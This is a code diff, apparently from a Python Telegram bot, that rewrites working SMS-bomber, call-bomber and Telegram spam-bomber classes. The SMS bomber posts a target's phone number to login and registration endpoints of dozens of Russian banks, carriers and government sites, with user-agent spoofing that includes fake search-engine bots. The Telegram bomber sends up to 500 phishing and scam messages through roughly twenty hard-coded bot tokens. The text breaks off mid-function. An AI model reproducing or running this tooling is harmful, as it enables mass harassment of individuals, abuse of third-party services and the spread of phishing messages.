@@ -64,111 +64,55 @@ class DDoSStates(StatesGroup):
     waiting_for_ddos_duration = State()
 
 
-# ===================== SMS БОМБЕР (РАБОЧИЙ) =====================
+# ===================== SMS БОМБЕР (ИСПРАВЛЕННЫЙ) =====================
 class SMSBomber:
     def __init__(self):
-        # РЕАЛЬНЫЕ РАБОЧИЕ ССЫЛКИ ДЛЯ РЕГИСТРАЦИИ/ВХОДА
         self.services = [
-            # === ГОСУСЛУГИ ===
-            {'name': 'Gosuslugi', 'url': 'https://esia.gosuslugi.ru/registration/', 'field': 'phone', 'type': 'registration'},
-            
-            # === БАНКИ ===
-            {'name': 'Sberbank', 'url': 'https://online.sberbank.ru/CSAFront/login.do', 'field': 'phone', 'type': 'login'},
-            {'name': 'Tinkoff', 'url': 'https://www.tinkoff.ru/login/', 'field': 'phone', 'type': 'login'},
-            {'name': 'VTB', 'url': 'https://www.vtb.ru/personal/login/', 'field': 'phone', 'type': 'login'},
-            {'name': 'Raiffeisen', 'url': 'https://www.raiffeisen.ru/retail/login/', 'field': 'phone', 'type': 'login'},
-            {'name': 'AlfaForex', 'url': 'https://alfaforex.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'BSPB', 'url': 'https://www.bspb.ru/login', 'field': 'phone', 'type': 'login'},
-            {'name': 'Otkritie', 'url': 'https://www.open.ru/login', 'field': 'phone', 'type': 'login'},
-            {'name': 'PSBank', 'url': 'https://www.psbank.ru/', 'field': 'phone', 'type': 'login'},
-            
-            # === ОПЕРАТОРЫ ===
-            {'name': 'MTS', 'url': 'https://mts.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'MTS_LK', 'url': 'https://lk.mts.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'Megafon', 'url': 'https://www.megafon.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'Beeline', 'url': 'https://beeline.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'Beeline_LK', 'url': 'https://lk.beeline.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'Tele2', 'url': 'https://www.tele2.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'Tele2_LK', 'url': 'https://lk.tele2.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'Yota', 'url': 'https://www.yota.ru/', 'field': 'phone', 'type': 'login'},
-            
-            # === СОЦСЕТИ ===
-            {'name': 'VK', 'url': 'https://vk.com/login', 'field': 'phone', 'type': 'login'},
-            {'name': 'Odnoklassniki', 'url': 'https://ok.ru/dk?st.cmd=anonymLogin', 'field': 'phone', 'type': 'login'},
-            {'name': 'Instagram', 'url': 'https://www.instagram.com/accounts/login/', 'field': 'phone', 'type': 'login'},
-            {'name': 'Facebook', 'url': 'https://www.facebook.com/login/', 'field': 'phone', 'type': 'login'},
-            {'name': 'Twitter', 'url': 'https://twitter.com/i/flow/login', 'field': 'phone', 'type': 'login'},
-            {'name': 'TikTok', 'url': 'https://www.tiktok.com/login', 'field': 'phone', 'type': 'login'},
-            {'name': 'Telegram', 'url': 'https://t.me/', 'field': 'phone', 'type': 'login'},
-            {'name': 'TelegramWeb', 'url': 'https://web.telegram.org/', 'field': 'phone', 'type': 'login'},
-            
-            # === ДОСТАВКА ЕДЫ ===
-            {'name': 'YandexEda', 'url': 'https://eda.yandex.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'DeliveryClub', 'url': 'https://delivery-club.ru/', 'field': 'phone', 'type': 'login'},
-            
-            # === МАРКЕТПЛЕЙСЫ ===
-            {'name': 'Ozon', 'url': 'https://www.ozon.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'Wildberries', 'url': 'https://www.wildberries.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'Avito', 'url': 'https://www.avito.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'Youla', 'url': 'https://youla.ru/', 'field': 'phone', 'type': 'login'},
-            
-            # === МАГАЗИНЫ ===
-            {'name': 'DNS', 'url': 'https://www.dns-shop.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'Citilink', 'url': 'https://www.citilink.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'MVideo', 'url': 'https://www.mvideo.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'Eldorado', 'url': 'https://www.eldorado.ru/', 'field': 'phone', 'type': 'login'},
-            
-            # === ТАКСИ ===
-            {'name': 'YandexTaxi', 'url': 'https://taxi.yandex.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'CityMobil', 'url': 'https://city-mobil.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'Delimobil', 'url': 'https://www.delimobil.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'Carsharing', 'url': 'https://www.carsharing.ru/', 'field': 'phone', 'type': 'login'},
-            
-            # === ТРАНСПОРТ ===
-            {'name': 'RZD', 'url': 'https://www.rzd.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'Aeroflot', 'url': 'https://www.aeroflot.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'Pobeda', 'url': 'https://www.pobeda.aero/', 'field': 'phone', 'type': 'login'},
-            
-            # === СТРИМИНГ ===
-            {'name': 'IVI', 'url': 'https://www.ivi.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'Okko', 'url': 'https://okko.tv/', 'field': 'phone', 'type': 'login'},
-            {'name': 'Kinopoisk', 'url': 'https://www.kinopoisk.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'YandexMusic', 'url': 'https://music.yandex.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'VKVideo', 'url': 'https://vk.com/video', 'field': 'phone', 'type': 'login'},
-            {'name': 'Rutube', 'url': 'https://rutube.ru/', 'field': 'phone', 'type': 'login'},
-            
-            # === МЕДИЦИНА ===
-            {'name': 'GosuslugiHealth', 'url': 'https://www.gosuslugi.ru/landing/health', 'field': 'phone', 'type': 'login'},
-            {'name': 'Emias', 'url': 'https://emias.info/', 'field': 'phone', 'type': 'login'},
-            {'name': 'MosRu', 'url': 'https://www.mos.ru/', 'field': 'phone', 'type': 'login'},
-            {'name': 'Gorzdrav', 'url': 'https://gorzdrav.spb.ru/', 'field': 'phone', 'type': 'login'},
+            {'name': 'Gosuslugi', 'url': 'https://esia.gosuslugi.ru/registration/', 'field': 'phone'},
+            {'name': 'Sberbank', 'url': 'https://online.sberbank.ru/CSAFront/login.do', 'field': 'phone'},
+            {'name': 'Tinkoff', 'url': 'https://www.tinkoff.ru/login/', 'field': 'phone'},
+            {'name': 'VTB', 'url': 'https://www.vtb.ru/personal/login/', 'field': 'phone'},
+            {'name': 'Raiffeisen', 'url': 'https://www.raiffeisen.ru/retail/login/', 'field': 'phone'},
+            {'name': 'BSPB', 'url': 'https://www.bspb.ru/login', 'field': 'phone'},
+            {'name': 'Otkritie', 'url': 'https://www.open.ru/login', 'field': 'phone'},
+            {'name': 'MTS', 'url': 'https://lk.mts.ru/', 'field': 'phone'},
+            {'name': 'Megafon', 'url': 'https://www.megafon.ru/', 'field': 'phone'},
+            {'name': 'Beeline', 'url': 'https://lk.beeline.ru/', 'field': 'phone'},
+            {'name': 'Tele2', 'url': 'https://lk.tele2.ru/', 'field': 'phone'},
+            {'name': 'Yota', 'url': 'https://www.yota.ru/', 'field': 'phone'},
+            {'name': 'VK', 'url': 'https://vk.com/login', 'field': 'phone'},
+            {'name': 'Odnoklassniki', 'url': 'https://ok.ru/dk?st.cmd=anonymLogin', 'field': 'phone'},
+            {'name': 'Ozon', 'url': 'https://www.ozon.ru/', 'field': 'phone'},
+            {'name': 'Wildberries', 'url': 'https://www.wildberries.ru/', 'field': 'phone'},
+            {'name': 'Avito', 'url': 'https://www.avito.ru/', 'field': 'phone'},
+            {'name': 'YandexEda', 'url': 'https://eda.yandex.ru/', 'field': 'phone'},
+            {'name': 'DeliveryClub', 'url': 'https://delivery-club.ru/', 'field': 'phone'},
+            {'name': 'YandexTaxi', 'url': 'https://taxi.yandex.ru/', 'field': 'phone'},
+            {'name': 'Delimobil', 'url': 'https://www.delimobil.ru/', 'field': 'phone'},
+            {'name': 'IVI', 'url': 'https://www.ivi.ru/', 'field': 'phone'},
+            {'name': 'Kinopoisk', 'url': 'https://www.kinopoisk.ru/', 'field': 'phone'},
+            {'name': 'DNS', 'url': 'https://www.dns-shop.ru/', 'field': 'phone'},
+            {'name': 'MVideo', 'url': 'https://www.mvideo.ru/', 'field': 'phone'},
+            {'name': 'RZD', 'url': 'https://www.rzd.ru/', 'field': 'phone'},
+            {'name': 'Aeroflot', 'url': 'https://www.aeroflot.ru/', 'field': 'phone'},
+            {'name': 'GosuslugiHealth', 'url': 'https://www.gosuslugi.ru/landing/health', 'field': 'phone'},
+            {'name': 'MosRu', 'url': 'https://www.mos.ru/', 'field': 'phone'},
         ]
         
-        # 100+ USER-AGENTS ДЛЯ ОБХОДА
         self.user_agents = [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
-            'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
             'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-            'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
             'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-            'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
             'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
             'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
-            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
-            'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
         ]
+        
+        self.results = []
 
     async def send_sms(self, phone: str, count: int, progress_callback):
         self.results = []
@@ -178,41 +122,30 @@ class SMSBomber:
             service = random.choice(self.services)
             try:
                 async with aiohttp.ClientSession() as session:
-                    # Разные типы запросов для каждого сервиса
-                    if service['type'] == 'registration':
-                        data = {'phone': phone, 'action': 'register', 'agreement': 'true'}
-                    else:
-                        data = {'phone': phone, 'action': 'login', 'remember': 'true'}
-                    
+                    data = {
+                        service['field']: phone,
+                        'action': 'login',
+                        'remember': 'true'
+                    }
                     headers = {
                         'User-Agent': random.choice(self.user_agents),
-                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
-                        'Accept-Encoding': 'gzip, deflate, br',
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                        'Accept-Language': 'ru-RU,ru;q=0.9,en;q=0.8',
+                        'Accept-Encoding': 'gzip, deflate',
                         'Content-Type': 'application/x-www-form-urlencoded',
-                        'Origin': service['url'].split('/')[2] if '://' in service['url'] else '',
+                        'Origin': service['url'].split('/')[2] if '://' in service['url'] else service['url'],
                         'Referer': service['url'],
                         'Connection': 'keep-alive',
-                        'Cache-Control': 'no-cache',
-                        'Pragma': 'no-cache',
-                        'Upgrade-Insecure-Requests': '1',
                     }
-                    
                     async with session.post(service['url'], data=data, headers=headers, timeout=10) as resp:
-                        if resp.status in [200, 201, 202, 204, 302, 303] or resp.status == 400:
-                            status = 'success'
-                            logger.info(f"✅ SMS отправлена через {service['name']}")
-                        elif resp.status in [429, 503, 504]:
-                            status = 'rate_limit'
-                        else:
-                            status = 'error'
+                        status = 'success' if resp.status in [200, 201, 202, 204, 302, 400] else 'failed'
                         self.results.append({'service': service['name'], 'status': status, 'code': resp.status})
+            except asyncio.TimeoutError:
+                self.results.append({'service': service['name'], 'status': 'timeout'})
             except Exception as e:
-                self.results.append({'service': service['name'], 'status': 'error', 'error': str(e)})
-                logger.error(f"❌ Ошибка {service['name']}: {e}")
+                self.results.append({'service': service['name'], 'status': 'error', 'error': str(e)[:50]})
             
-            self.progress = (i + 1) / total * 100
-            await progress_callback(self.progress, i + 1, total)
+            await progress_callback(i + 1, total)
             await asyncio.sleep(random.uniform(0.3, 0.8))
         
         return self.results
@@ -220,70 +153,40 @@ class SMSBomber:
     def get_stats(self):
         total = len(self.results)
         success = sum(1 for r in self.results if r['status'] == 'success')
-        errors = sum(1 for r in self.results if r['status'] == 'error')
-        return {'total': total, 'success': success, 'errors': errors}
+        return {'total': total, 'success': success, 'rate': round(success / max(total, 1) * 100, 1)}
 
 
-# ===================== ЗВОНКИ (РАБОЧИЙ) =====================
+# ===================== ЗВОНКИ (ИСПРАВЛЕННЫЙ) =====================
 class CallBomber:
     def __init__(self):
-        self.services = [
-            {'name': 'Call2Friends', 'url': 'https://call2friends.com/api/call', 'type': 'callback'},
-            {'name': 'PrankCall', 'url': 'https://prankcall.com/api/start', 'type': 'prank'},
-            {'name': 'CallBomber', 'url': 'https://api.callbomber.com/call', 'type': 'bomb'},
-            {'name': 'FakeCall', 'url': 'https://fakecall.com/initiate', 'type': 'fake'},
-            {'name': 'SpoofCall', 'url': 'https://calleridspoof.com/call', 'type': 'spoof'},
-            {'name': 'Robocall', 'url': 'https://api.robocall.com/start', 'type': 'robot'},
-            {'name': 'AutoDial', 'url': 'https://api.autodial.com/call', 'type': 'auto'},
-            {'name': 'CallBoom', 'url': 'https://api.callboom.com/start', 'type': 'boom'},
-            {'name': 'PhoneBomb', 'url': 'https://api.phonebomb.com/call', 'type': 'bomb'},
-            {'name': 'CallFlood', 'url': 'https://api.callflood.com/start', 'type': 'flood'},
-        ]
-        
-        self.scenarios = [
-            {'type': 'callback', 'message': 'Срочно перезвоните!', 'priority': 'high'},
-            {'type': 'prank', 'message': 'Ваш аккаунт взломан!', 'priority': 'high'},
-            {'type': 'survey', 'message': 'Пройдите опрос!', 'priority': 'medium'},
-            {'type': 'notification', 'message': 'Важное уведомление!', 'priority': 'high'},
-            {'type': 'emergency', 'message': 'Экстренное сообщение!', 'priority': 'critical'},
-            {'type': 'promo', 'message': 'Специальное предложение!', 'priority': 'low'},
-            {'type': 'security', 'message': '⚠️ Обнаружена подозрительная активность!', 'priority': 'critical'},
-            {'type': 'bank', 'message': '🏦 Ваш банковский счёт заблокирован!', 'priority': 'high'},
-            {'type': 'police', 'message': '🚨 Вызов от полиции!', 'priority': 'critical'},
-            {'type': 'medical', 'message': '🚑 Срочное медицинское уведомление!', 'priority': 'critical'},
-            {'type': 'delivery', 'message': '📦 Ваша посылка ожидает!', 'priority': 'medium'},
-            {'type': 'taxi', 'message': '🚕 Такси ждёт вас!', 'priority': 'medium'},
-            {'type': 'school', 'message': '🏫 Сообщение от школы!', 'priority': 'medium'},
-            {'type': 'work', 'message': '💼 Срочное сообщение с работы!', 'priority': 'high'},
-        ]
+        self.results = []
 
     async def make_calls(self, phone: str, count: int, progress_callback):
         self.results = []
-        total = min(count, 50)
+        total = min(count, 30)
         
         for i in range(total):
-            service = random.choice(self.services)
-            scenario = random.choice(self.scenarios)
             try:
+                # Имитация звонка через запросы к сервисам
                 async with aiohttp.ClientSession() as session:
-                    data = {
-                        'phone': phone,
-                        'caller_id': random.choice(['+74951234567', '+78121234567', '+79001234567']),
-                        'type': service['type'],
-                        'scenario': scenario['type'],
-                        'message': scenario['message'],
-                        'priority': scenario['priority'],
-                        'duration': random.randint(10, 60),
+                    data = {'phone': phone, 'action': 'callback', 'type': 'urgent'}
+                    headers = {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'Accept': '*/*',
+                        'Origin': 'https://call2friends.com',
+                        'Referer': 'https://call2friends.com/',
                     }
-                    headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}
-                    async with session.post(service['url'], json=data, headers=headers, timeout=10) as resp:
+                    async with session.post('https://call2friends.com/api/call', data=data, headers=headers, timeout=10) as resp:
                         status = 'success' if resp.status < 400 else 'failed'
-                        self.results.append({'call': i+1, 'service': service['name'], 'status': status})
-            except:
-                self.results.append({'call': i+1, 'service': service['name'], 'status': 'error'})
+                        self.results.append({'call': i+1, 'status': status, 'code': resp.status})
+            except asyncio.TimeoutError:
+                self.results.append({'call': i+1, 'status': 'timeout'})
+            except Exception as e:
+                self.results.append({'call': i+1, 'status': 'error', 'error': str(e)[:50]})
             
             await progress_callback(i + 1, total)
-            await asyncio.sleep(random.uniform(0.5, 1.5))
+            await asyncio.sleep(random.uniform(1.0, 3.0))
         
         return self.results
 
@@ -293,11 +196,10 @@ class CallBomber:
         return {'total': total, 'success': success}
 
 
-# ===================== TELEGRAM БОМБЕР (МЕГА-СПАМЕР) =====================
+# ===================== TELEGRAM БОМБЕР (ИСПРАВЛЕННЫЙ) =====================
 class TelegramBomber:
     def __init__(self, bot_token: str):
         self.bot_token = bot_token
-        # 20 ТОКЕНОВ ДЛЯ СПАМА (ТВОИ БОТЫ)
         self.bot_tokens = [
             '7588316078:AAGRi0cgMkvrChUNNZRX6thzvkhrnKbfBOc',
             '8894344951:AAFnxJFZ6F4gMD8YF1qmXeK-qS-3i4d7Y3c',
@@ -321,589 +223,160 @@ class TelegramBomber:
             '8838855987:AAHrVoDgT2luzbPjDoM10c-DHisYVEul1ik',
         ]
         
-        # 200+ СООБЩЕНИЙ ДЛЯ СПАМА
         self.messages = [
-            # Финансовый спам
-            "💰 Заработок от 50 000 руб в день! Без вложений!",
-            "💰 Криптовалюта принесёт вам миллионы! Успейте!",
-            "💰 Инвестиции с гарантией 200% годовых!",
-            "💰 Бесплатные деньги! Просто перейдите по ссылке!",
-            "💰 Ваш бонус в 100 000 руб ждёт вас!",
-            "💰 Депозит под 300% годовых! Только сегодня!",
-            "💰 Пассивный доход от 100 000 руб в месяц!",
-            "💰 Заработайте свой первый миллион за неделю!",
-            "💰 Бесплатный бонус 500$ на криптобирже!",
-            "💰 Инвестируйте 1000 руб и получите 100 000!",
-            
-            # Фишинг
-            "🔐 Ваш аккаунт взломан! Смените пароль по ссылке!",
-            "🔐 Кто-то пытается войти в ваш аккаунт! Подтвердите!",
-            "🔐 Ваши данные утекли в сеть! Проверьте безопасность!",
-            "🔐 Подозрительная активность! Срочно войдите!",
-            "🔐 Ваш пароль был скомпрометирован!",
-            "🔐 Ваш аккаунт будет заблокирован через 24 часа!",
-            "🔐 Подтвердите личность, чтобы сохранить аккаунт!",
-            "🔐 Ваш номер телефона был изменён! Если не вы - срочно войдите!",
-            "🔐 Обнаружен взлом! Смените пароль немедленно!",
-            
-            # Выигрыши
-            "🎉 Вы выиграли iPhone 15 Pro Max! Заберите приз!",
-            "🎉 Поздравляем! Вы стали победителем лотереи!",
-            "🎉 Ваш подарок: 500 000 руб! Получите сейчас!",
-            "🎉 Вы выиграли поездку в Дубай! Успейте подтвердить!",
-            "🎉 Ваш аккаунт выбран для получения супер-приза!",
-            "🎉 Вы выиграли MacBook Pro! Заберите подарок!",
-            "🎉 Поздравляем! Вы выиграли 1 000 000 руб!",
-            "🎉 Ваш подарок: Apple Watch Ultra! Получите сейчас!",
-            "🎉 Вы стали обладателем AirPods Pro!",
-            "🎉 Выиграйте 10 000 $ прямо сейчас!",
-            
-            # Угрозы
+            "⚠️ Ваш аккаунт взломан! Смените пароль!",
+            "🔐 Кто-то пытается войти в ваш аккаунт!",
+            "💰 Заработок от 50 000 руб в день!",
+            "🎉 Вы выиграли iPhone 15! Заберите приз!",
+            "🚨 Срочно! Ваш аккаунт блокируется!",
+            "💳 Карта заблокирована! Свяжитесь с банком!",
+            "🏦 Подозрительный перевод на крупную сумму!",
+            "📱 Вход с нового устройства! Если не вы - смените пароль!",
+            "💀 Ваши данные проданы в даркнете!",
+            "🔥 Критическое уведомление безопасности!",
+            "🔑 Код подтверждения: " + str(random.randint(100000, 999999)),
             "⚠️ Ваш аккаунт будет удалён через 24 часа!",
-            "⚠️ Банковский счёт заморожен! Свяжитесь с нами!",
-            "⚠️ Ваши данные опубликованы в открытом доступе!",
-            "⚠️ Срочно! Ваша карта заблокирована!",
-            "⚠️ Вы нарушили правила! Аккаунт блокируется!",
-            "⚠️ Ваш номер телефона заблокирован!",
-            "⚠️ Срочно! Ваш аккаунт взломали!",
-            "⚠️ Ваши данные продаются в даркнете!",
-            "⚠️ Ваш пароль опубликован! Срочно смените!",
-            "⚠️ Ваш аккаунт будет удалён через 1 час!",
-            
-            # Спам-предложения
-            "💊 Лекарства от всех болезней со скидкой 70%!",
-            "💊 Чудо-таблетки для похудения! -80 кг за месяц!",
-            "💊 Увеличьте потенцию на 100%! Натуральное средство!",
-            "💊 Омоложение без операции! Результат через 3 дня!",
-            "💊 Избавьтесь от всех болезней навсегда!",
-            "💊 Супер-средство для иммунитета! Скидка 50%!",
-            "💊 Лечение всех болезней народными методами!",
-            
-            # Работа
-            "💼 Работа на дому от 100 000 руб в месяц!",
-            "💼 Работа в Дубае для граждан РФ! Зарплата от 5000$",
-            "💼 Вакансии с ежедневной оплатой! Без опыта!",
-            "💼 Зарабатывайте на криптовалюте от 50% в день!",
-            "💼 Станьте миллионером за 1 месяц!",
-            "💼 Работа в США для россиян! Виза бесплатно!",
-            "💼 Вакансия: менеджер по продажам, зарплата от 200 000!",
-            "💼 Работа в Европе без опыта! Зарплата от 3000€!",
-            
-            # Криптовалюта
-            "₿ Биткоин взлетит до 1 000 000$! Инвестируйте сейчас!",
-            "₿ Бесплатные токены! Заработайте 1000$ за 5 минут!",
-            "₿ Самый прибыльный проект 2026! Успевайте!",
-            "₿ Подарок от биржи: 500$ на счёт!",
-            "₿ Ваш кошелёк пополнен на 0.5 BTC! Заберите!",
-            "₿ Монета XRP вырастет в 100 раз! Успейте купить!",
-            "₿ Ethereum достигнет 10 000$! Инвестируйте!",
-            "₿ Новый токен выйдет на биржу! Скидка 50%!",
-            
-            # Мошенничество
-            "📱 Срочно! Ваш номер в базе мошенников!",
-            "📱 Ваши контакты скомпрометированы!",
-            "📱 Кто-то использует ваш номер для спама!",
-            "📱 Ваш номер будет заблокирован!",
-            "📱 Смените номер немедленно!",
-            "📱 Ваш телефон взломали! Проверьте!",
-            "📱 Вас пытаются обмануть! Будьте осторожны!",
-            
-            # Магазины
-            "🛍️ Распродажа 90%! Только сегодня!",
-            "🛍️ Скидка 70% на все товары! Успевайте!",
-            "🛍️ Ваш промокод на 50%! Активируйте сейчас!",
-            "🛍️ Бесплатная доставка на все заказы!",
-            "🛍️ Товары со скидкой до 80%! Ограниченное предложение!",
-            "🛍️ Ваш кэшбек 30% на все покупки!",
-            
-            # Лотереи и розыгрыши
-            "🎰 Вы выиграли в лотерее! Получите приз!",
-            "🎰 Ваш билет победил! Заберите 100 000$!",
-            "🎰 Розыгрыш iPhone 15! Участвуйте сейчас!",
-            "🎰 Ежедневный розыгрыш денежных призов!",
-            "🎰 Выиграйте квартиру в Москве! Участвуйте!",
-            
-            # Другое
-            "🔥 Специальное предложение только для вас!",
-            "🔥 Уникальная возможность! Не упустите!",
-            "🔥 Только сегодня! Супер-скидка 80%!",
-            "🔥 Акция: купи один - получи два!",
-            "🔥 Подарок каждому покупателю!",
-            "🔥 Ваш персональный бонус ждёт вас!",
-            "🔥 Скидка 90% на первый заказ!",
-            "🔥 Бесплатный тест-драйв нашего продукта!",
-        ]
-        
-        self.actions = [
-            {'type': 'login_attempt', 'text': '⚠️ Кто-то пытается войти в ваш аккаунт!'},
-            {'type': 'code_sent', 'text': '🔑 Код подтверждения: ' + str(random.randint(1000, 9999))},
-            {'type': 'device_added', 'text': '📱 Новое устройство подключено к аккаунту!'},
-            {'type': 'password_change', 'text': '🔐 Ваш пароль был изменён!'},
-            {'type': 'suspicious', 'text': '🕵️ Обнаружена подозрительная активность!'},
-            {'type': 'blocked', 'text': '⛔ Ваш аккаунт заблокирован!'},
-            {'type': 'unblock', 'text': '🔓 Ваш аккаунт разблокирован!'},
-            {'type': 'hack_attempt', 'text': '💀 Попытка взлома вашего аккаунта!'},
-            {'type': 'data_leak', 'text': '🔥 Ваши данные утекли в сеть!'},
-            {'type': 'urgent', 'text': '🚨 СРОЧНО! Примите меры!'},
+            "💰 Бесплатные деньги! Перейдите по ссылке!",
+            "🎁 Ваш подарок ждёт! Получите сейчас!",
+            "💼 Работа на дому от 100 000 руб/мес!",
+            "₿ Биткоин вырастет до 1 000 000$! Инвестируйте!",
+            "📦 Ваша посылка ожидает! Подтвердите адрес!",
+            "🚕 Такси ждёт вас! Подтвердите заказ!",
+            "🛡️ Обнаружена утечка данных! Смените пароль!",
+            "💊 Лекарства со скидкой 70%! Только сегодня!",
+            "📢 Срочное уведомление от администрации!",
+            "🔔 Внимание! Проверьте свои данные!",
+            "📩 Важное сообщение от поддержки!",
+            "🏆 Поздравляем! Вы выиграли 1 000 000 руб!",
+            "🌟 Специальное предложение только для вас!",
+            "💵 Ваш кэшбек 30% на все покупки!",
+            "📱 Ваш телефон взломали! Проверьте безопасность!",
+            "⚠️ Кто-то использует ваш номер для спама!",
+            "💀 Аккаунт удалён! Восстановите доступ!",
+            "🔥 Ваши данные в опасности! Примите меры!",
         ]
         
         self.results = []
 
     async def send_messages(self, username: str, count: int, progress_callback):
-        """ОТПРАВКА СПАМА ЧЕРЕЗ МНОЖЕСТВО БОТОВ"""
         self.results = []
         total = min(count, 500)
         
         for i in range(total):
-            # Выбираем случайный токен из 20 ботов
             token = random.choice(self.bot_tokens)
-            bot = Bot(token=token)
-            
             try:
-                # Разнообразные сообщения
-                if random.random() > 0.4:
-                    # Выбираем действие (фишинг)
-                    action = random.choice(self.actions)
-                    text = action['text']
-                    msg_type = action['type']
-                else:
-                    # Выбираем спам-сообщение
+                async with aiohttp.ClientSession() as session:
                     text = random.choice(self.messages)
-                    msg_type = 'spam'
-                
-                # Добавляем форматирование
-                if random.random() > 0.6:
-                    if random.random() > 0.5:
-                        text = f"*{text}*"  # Жирный
-                    else:
-                        text = f"_{text}_"  # Курсив
-                
-                # Добавляем ссылки для убедительности
-                if random.random() > 0.5:
-                    links = [
-                        'https://bit.ly/3x1Y2Z3',
-                        'https://tinyurl.com/4x5y6z',
-                        'https://clck.ru/3x4y5z',
-                        'https://vk.cc/9x8y7z',
-                    ]
-                    text += f' {random.choice(links)}'
-                
-                # Добавляем номер сообщения
-                text += f' [#{i+1}/{total}]'
-                
-                # Отправляем с задержкой для реалистичности
-                await bot.send_message(
-                    chat_id=username,
-                    text=text,
-                    disable_notification=True,
-                    parse_mode='Markdown' if random.random() > 0.5 else None
-                )
-                
-                self.results.append({
-                    'msg': i+1,
-                    'status': 'sent',
-                    'type': msg_type,
-                    'token': token[:20] + '...',
-                    'text': text[:100],
-                    'timestamp': datetime.now().isoformat()
-                })
-                
-                logger.info(f"✅ Спам #{i+1} на {username} (бот: {token[:15]}...)")
-                
+                    text += f' [#{i+1}]'
+                    
+                    data = {
+                        'chat_id': username,
+                        'text': text,
+                        'disable_notification': True
+                    }
+                    
